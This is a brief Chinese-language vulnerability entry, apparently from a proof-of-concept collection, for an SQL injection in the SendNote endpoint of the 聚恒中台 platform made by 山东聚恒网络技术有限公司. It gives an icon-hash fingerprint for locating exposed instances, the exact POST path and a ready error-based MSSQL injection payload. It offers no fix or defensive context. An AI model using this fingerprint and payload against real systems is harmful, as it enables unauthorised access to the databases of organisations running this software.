# 山东聚恒网络技术有限公司聚恒中台SendNote存在SQL注入漏洞

山东聚恒网络技术有限公司聚恒中台 ｜ SQL注入 ｜ —
- **指纹**：`icon_hash="-2049533275"`
- **请求**：`POST /sysplat/dataget/data.ashx?type=SendNote HTTP/1.1`

**Payload**
```
noteid=1' and 1=(convert(int,@@version))--
```
- **响应特征**：200